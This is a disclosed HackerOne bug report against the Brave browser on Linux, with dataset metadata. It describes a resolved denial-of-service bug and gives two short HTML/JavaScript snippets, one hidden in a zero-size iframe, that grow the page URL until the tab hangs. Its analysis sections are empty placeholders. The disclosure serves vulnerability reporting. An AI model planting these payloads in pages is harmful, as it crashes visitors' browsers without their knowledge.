---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '181558'
original_report_id: '181558'
title: '[DOS] denial of service using code snippet on brave browser'
weakness: Uncontrolled Resource Consumption
team_handle: brave
created_at: '2016-11-11T11:51:05.722Z'
disclosed_at: '2018-05-06T20:57:55.812Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- uncontrolled-resource-consumption
---

# [DOS] denial of service using code snippet on brave browser

## Metadata

- HackerOne Report ID: 181558
- Weakness: Uncontrolled Resource Consumption
- Program: brave
- Disclosed At: 2018-05-06T20:57:55.812Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

brave browser hangs due to no validation  for  a  code snippet causing denial of service to users.

## Products affected: 
latest brave browser in linux

## Steps To Reproduce:

code snippet:-

1) <script>window.location+='?\u202a\uFEFF\u202b';</script> 

OR

2) <iframe style="width:0;height:0;border:0" src="data:text/html;charset=utf-8,<script>window.location+='?'+window.location.toString().split('');</script>">

Note :- both these issues have been fixed in google chrome and firefox gives some delay time to close tabs.

This is a variation of "a = a + a" that creates a very long URL. on my machine the 
renderer eventually is killed when the URL gets too large.

## Supporting Material/References:

i have attached both html files you can open them up and see browser hang.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
